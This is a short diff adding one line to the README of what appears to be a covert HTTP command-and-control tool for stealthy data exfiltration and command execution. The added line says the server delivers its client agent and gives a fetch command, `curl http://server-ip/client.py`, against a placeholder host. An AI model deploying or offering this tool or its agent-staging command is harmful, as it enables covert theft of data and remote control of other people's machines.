@@ -38,6 +38,7 @@ Covert HTTP smuggling tool for stealthy data exfiltration and command execution,
 - Handles both command output and file uploads
 - Stores received data with timestamps
 - Includes basic security measures
+- The server can deliver the client agent for easy deployment. For example using `curl http://server-ip/client.py`
 
 ## Installation
 
